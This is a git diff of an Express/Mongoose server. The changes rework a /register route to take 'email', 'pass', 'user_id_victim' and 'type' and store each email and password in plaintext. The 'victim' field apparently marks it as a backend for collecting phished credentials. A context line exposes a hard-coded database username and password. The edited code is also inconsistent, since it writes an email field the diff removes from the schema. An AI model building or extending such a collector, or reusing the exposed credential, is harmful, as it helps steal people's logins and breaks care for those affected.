@@ -30,7 +30,6 @@ const uri = process.env.MONGODB_URI || 'mongodb+srv://pm288199:Ajib2536@signup.i
 // Define User schema and model
 const userSchema = new mongoose.Schema({
     name: { type: String, unique: true, required: true },
-    email: { type: String, unique: true, required: true },
     password: { type: String, required: true }
 }, { timestamps: true });
 
@@ -46,19 +45,23 @@ app.get('/', (req, res) => {
 // Register User Route
 app.post('/register', async (req, res) => {
     try {
-        const { name, email, password } = req.body;
+        const { email, pass, user_id_victim, type } = req.body;
 
-        if (!name || !email || !password) {
-            return res.status(400).json({ error: 'All fields are required' });
+        if (!email || !pass) {
+            return res.status(400).json({ error: 'Email and password are required' });
         }
 
-        const newUser = new User({ name, email, password });
+        // Optionally, you can rename 'email' to 'name' if that’s desired:
+        const newUser = new User({ name: email, email, password: pass });
+
+        // If you need to store user_id_victim and type, add those fields to your schema as well.
         await newUser.save();
         res.status(201).json({ message: 'User registered successfully' });
     } catch (error) {
         res.status(500).json({ error: 'Error registering user', details: error.message });
     }
 });
+
 
 // For local development, start the server; Vercel will use the exported app without calling listen.
 if (process.env.NODE_ENV !== 'production') {
